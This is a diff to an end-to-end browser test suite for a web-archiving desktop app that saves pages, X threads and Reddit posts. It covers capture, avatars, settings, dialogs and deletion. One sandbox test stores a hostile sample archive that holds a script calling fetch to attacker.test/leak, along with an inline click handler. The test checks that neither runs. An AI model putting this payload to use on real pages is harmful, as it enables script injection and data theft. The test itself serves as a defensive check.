@@ -193,7 +193,7 @@ try {
     });
     const item = await post("/api/items", {
       ...capture,
-      snapshot: rewrite(capture.snapshot, resources),
+      content: capture.content ? rewrite(capture.content, resources) : null,
       resources,
     });
     return item;
@@ -216,21 +216,49 @@ try {
     });
     await page.waitForTimeout(1800);
   }
+  const avatarUrl = "http://127.0.0.1:1420/fixtures/avatar.svg";
   const article = await collect("http://127.0.0.1:1420/fixtures/article.html");
-  assert.match(article.snapshot, /把日常/);
-  assert.doesNotMatch(article.snapshot, /<script/);
-  assert.match(article.snapshot, /id="sky"/);
-  assert.match(article.snapshot, /url\(&quot;#sky/);
+  await source.evaluate((url) => {
+    const image = document.createElement("img");
+    image.id = "web-avatar";
+    image.src = url;
+    image.width = 32;
+    image.height = 32;
+    document.body.prepend(image);
+  }, avatarUrl);
+  const withAvatar = await source.evaluate(() =>
+    GlassmarkCapture.collect({ mode: "page" }),
+  );
+  Object.assign(article, withAvatar);
+  assert.ok(article.resources.includes(avatarUrl));
+  assert.match(article.content, /把日常/);
+  assert.doesNotMatch(article.content, /<script/);
+  assert.match(article.content, /id="sky"/);
+  assert.match(article.content, /url\(&quot;#sky/);
   const articleItem = await save(article);
   pass(
-    "full-page capture preserves computed styles, SVG fragments, fonts and source JS",
+    "full-page capture preserves computed styles, SVG fragments, fonts and media",
   );
   await page.locator("[data-item]").first().waitFor({ timeout: 20000 });
   await page
-    .frameLocator("#snapshot")
+    .frameLocator("#saved-page")
     .getByRole("heading", { name: "把日常，过成值得收藏的风景", exact: true })
     .waitFor();
-  assert.equal(await page.locator("#snapshot").getAttribute("sandbox"), "");
+  assert.equal(
+    await page.locator("#saved-page").getAttribute("sandbox"),
+    "allow-same-origin",
+  );
+  await expect(
+    page.frameLocator("#saved-page").locator("#web-avatar"),
+  ).toBeVisible();
+  await expect
+    .poll(() =>
+      page
+        .frameLocator("#saved-page")
+        .locator("#web-avatar")
+        .evaluate((i) => i.complete && i.naturalWidth > 0),
+    )
+    .toBe(true);
   if (recording) await page.waitForTimeout(3000);
   await page.screenshot({ path: "artifacts/glassmark-article.png" });
   // Multiple selected roots are combined without their unrelated siblings.
@@ -279,6 +307,22 @@ try {
   const x = await collect("https://x.com/lin/status/1001", "thread", {
     maxPosts: 3,
   });
+  await source.evaluate((url) => {
+    const wrapper = document.createElement("span");
+    wrapper.dataset.testid = "UserAvatar";
+    const img = document.createElement("img");
+    img.src = url;
+    wrapper.append(img);
+    document.querySelector("article").prepend(wrapper);
+  }, avatarUrl);
+  Object.assign(
+    x,
+    await source.evaluate(() =>
+      GlassmarkCapture.collect({ mode: "thread", maxPosts: 3 }),
+    ),
+  );
+  assert.ok(x.resources.includes(avatarUrl));
+  assert.equal(x.posts[0].avatarUrl, avatarUrl);
   assert.equal(x.posts.length, 3);
   assert.equal(x.platform, "x");
   assert.equal(x.posts[0].authorName, "Lin");
@@ -293,7 +337,22 @@ try {
     "social metadata preserves author, media and metrics for both thread and full-page capture",
   );
   const xItem = await save(x);
-  pass("X adapter preserves a main post and replies with their UI");
+  const lean = await source.evaluate(async () => {
+    const read = window.getComputedStyle;
+    window.getComputedStyle = () => {
+      throw new Error("social capture must not walk CSS");
+    };
+    try {
+      return await GlassmarkCapture.collect({ mode: "thread", maxPosts: 1 });
+    } finally {
+      window.getComputedStyle = read;
+    }
+  });
+  assert.equal(lean.posts.length, 1);
+  assert.equal(lean.content, null);
+  pass(
+    "posts save directly as structured content and persist avatars without walking CSS",
+  );
   await page.locator('button[data-view="x"]').click();
   await page
     .locator(`.x-post[data-open-archive="${xItem.id}"]`)
@@ -319,7 +378,13 @@ try {
   );
   assert.ok((await page.locator('[data-icon-source="lucide"]').count()) > 15);
   assert.equal(await page.locator("#folders").isVisible(), false);
-  assert.equal(await page.locator("#snapshot").count(), 0);
+  assert.equal(await page.locator("#saved-page").count(), 0);
+  assert.equal(
+    await page
+      .locator(`.x-post[data-open-archive="${xItem.id}"] .social-avatar img`)
+      .evaluate((i) => i.complete && i.naturalWidth > 0),
+    true,
+  );
   await page.screenshot({ path: "artifacts/glassmark-x.png" });
   await page.locator(`.x-post[data-open-archive="${xItem.id}"]`).click();
   assert.equal(await page.locator(".x-reply").count(), 2);
@@ -327,17 +392,8 @@ try {
     await page.locator(".discussion-scope").textContent(),
     /已保存 2 条/,
   );
-  await page.locator(".x-snapshot-link").click();
-  await page
-    .frameLocator("#snapshot")
-    .getByText("Lin", { exact: false })
-    .first()
-    .waitFor();
-  await page.locator("#snapshot-back").click();
   await page.getByRole("button", { name: "返回信息流", exact: true }).click();
-  pass(
-    "X has a dedicated timeline, thread detail and original-snapshot return path",
-  );
+  pass("X has a saved-content timeline and structured thread detail");
   // Model a virtualized feed: only one DOM article exists at any point.
   await source.evaluate(() => {
     document.querySelectorAll("article").forEach((el, i) => {
@@ -355,7 +411,8 @@ try {
     GlassmarkCapture.collect({ mode: "thread", maxPosts: 3 }),
   );
   assert.equal(virtual.posts.length, 3);
-  assert.match(virtual.snapshot, /Virtual reply/);
+  assert.ok(virtual.posts.some((p) => /Virtual reply/.test(p.text)));
+  assert.equal(virtual.content, null);
   pass("X accumulation retains posts removed by virtual scrolling");
   await source.route("https://www.reddit.com/**", (route) =>
     route.fulfill({
@@ -389,19 +446,8 @@ try {
     /#39/,
   );
   await page.screenshot({ path: "artifacts/glassmark-reddit.png" });
-  await page.getByRole("button", { name: "原始快照", exact: true }).click();
-  await page
-    .frameLocator("#snapshot")
-    .getByRole("heading", {
-      name: "What makes a personal archive actually useful?",
-      exact: true,
-    })
-    .waitFor();
-  await page.locator("#snapshot-back").click();
   await page.getByRole("button", { name: "返回信息流", exact: true }).click();
-  pass(
-    "Reddit has a dedicated community feed, comment tree and original-snapshot return path",
-  );
+  pass("Reddit has a saved-content feed and persistent comment tree");
   await source.evaluate(() => {
     const el = document.querySelector("shreddit-comment");
     for (let i = 0; i < 105; i++) {
@@ -452,11 +498,35 @@ try {
   await page.waitForTimeout(700);
   await page.locator(`[data-item="${articleItem.id}"]`).click();
   await page.locator("#tag-button").click();
-  await page.locator("#tag-input").fill("设计, 日常, 灵感");
+  await page.locator(".new-tag-inline summary").click();
+  await page.locator("#new-item-tag").fill("灵感");
+  await page.locator("#create-item-tag").click();
+  await page.locator('.tag-choice input[value="灵感"]').waitFor();
+  assert.equal(
+    await page.locator('.tag-choice input[value="设计"]').isChecked(),
+    true,
+  );
   await page.getByRole("button", { name: "保存标签", exact: true }).click();
   await page.getByText("# 灵感", { exact: true }).first().waitFor();
   pass("tag editing updates the library and filters");
   await page.locator("#settings").click();
+  await page.locator('[data-settings-category="media"]').click();
+  await page.getByLabel("单次下载上限（MB）", { exact: true }).fill("750");
+  await page.getByLabel("并发下载数", { exact: true }).fill("4");
+  await page.locator('[data-settings-category="capture"]').click();
+  await page.getByLabel("自动加载时长（秒）", { exact: true }).fill("12");
+  await page.getByRole("button", { name: "保存设置", exact: true }).click();
+  const prefs = await get("/api/preferences");
+  assert.equal(prefs.downloadLimitMb, 750);
+  assert.equal(prefs.downloadConcurrency, 4);
+  assert.equal(prefs.autoLoadSeconds, 12);
+  const extensionOptions = await get("/api/capture-options");
+  assert.equal(extensionOptions.preferences.downloadLimitMb, 750);
+  pass(
+    "grouped settings persist capture duration and shared media limits for the extension",
+  );
+  await page.locator("#settings").click();
+  await page.locator('[data-settings-category="connection"]').click();
   await page.locator("#pairing-code").waitFor();
   assert.match(await page.locator("#pairing-code").textContent(), /^\d{6}$/);
   if (recording) await page.waitForTimeout(2500);
@@ -464,16 +534,15 @@ try {
   await page.getByRole("button", { name: "关闭", exact: true }).click();
   // A hostile archive must remain inert and make no network requests.
   const hostile = await post("/api/items", {
-    version: 1,
+    version: 2,
     title: "Sandbox test",
     url: "https://example.test",
     platform: "web",
     mode: "page",
     capturedAt: new Date().toISOString(),
     text: "sandbox",
-    snapshot:
+    content:
       '<html><head></head><body><script>parent.__PWNED=1;fetch("https://attacker.test/leak")</script><img src="https://attacker.test/image"><button onclick="parent.__PWNED=2">inert button</button></body></html>',
-    original: "<script>saved source</script>",
     resources: [],
     posts: [],
     warnings: [],
@@ -484,7 +553,7 @@ try {
   });
   await page.locator(`[data-item="${hostile.id}"]`).waitFor({ timeout: 20000 });
   await page.locator(`[data-item="${hostile.id}"]`).click();
-  await page.frameLocator("#snapshot").getByText("inert button").click();
+  await page.frameLocator("#saved-page").getByText("inert button").click();
   await page.waitForTimeout(300);
   assert.equal(await page.evaluate(() => globalThis.__PWNED), undefined);
   assert.equal(leaked.length, 0);
@@ -494,7 +563,7 @@ try {
   await page.waitForTimeout(3300);
   await page.locator(`[data-item="${articleItem.id}"]`).click();
   await page
-    .frameLocator("#snapshot")
+    .frameLocator("#saved-page")
     .getByRole("heading", { name: "把日常，过成值得收藏的风景", exact: true })
     .waitFor();
   if (recording) await page.waitForTimeout(1800);
@@ -894,6 +963,63 @@ try {
     "关闭窗口",
   );
   pass("window controls reveal hover symbols and labelled tooltips");
+  await page.locator('button[data-view="web"]').click();
+  await page.locator("#new-folder").click();
+  await page.locator("#dialog-close").click();
+  await expect(page.locator("#dialog")).not.toBeVisible();
+  await page.locator("#new-folder").click();
+  await page.keyboard.press("Escape");
+  await expect(page.locator("#dialog")).not.toBeVisible();
+  await page.locator("#new-folder").click();
+  await page.locator("#dialog-cancel").click();
+  await expect(page.locator("#dialog")).not.toBeVisible();
+  pass(
+    "empty folder dialogs close through close, Escape and Cancel without validation traps",
+  );
+  await page.locator("#saved-page").waitFor({ state: "visible" });
+  assert.equal(
+    await page.locator(".reader-heading,.preview-chrome").count(),
+    0,
+  );
+  assert.equal(await page.locator("#page-metadata").isVisible(), true);
+  const coverage = await page
+    .locator("#saved-page")
+    .evaluate(
+      (el) =>
+        el.getBoundingClientRect().height /
+        document.querySelector("#reader").getBoundingClientRect().height,
+    );
+  assert.ok(coverage > 0.95);
+  pass(
+    "web content fills the reader while metadata lives beside the folder breadcrumb",
+  );
+  const deletion = await save({
+    ...videoCapture,
+    resources: [],
+    tags: ["删除测试"],
+  });
+  await page.locator('button[data-view="x"]').click();
+  await page.waitForTimeout(3300);
+  await page
+    .locator(`.x-post[data-open-archive="${deletion.id}"] .post-menu summary`)
+    .click();
+  await page
+    .locator(
+      `.x-post[data-open-archive="${deletion.id}"] [data-social-action="delete"]`,
+    )
+    .click();
+  await page
+    .locator("#dialog-actions")
+    .getByRole("button", { name: "删除收藏", exact: true })
+    .click();
+  await expect(
+    page.locator(`.x-post[data-open-archive="${deletion.id}"]`),
+  ).toHaveCount(0);
+  assert.equal(
+    (await get("/api/items")).some((i) => i.id === deletion.id),
+    false,
+  );
+  pass("post menus delete persistent content from the feed and search index");
   assert.deepEqual(errors, []);
   pass("desktop interface has no uncaught JavaScript errors");
   const report = {
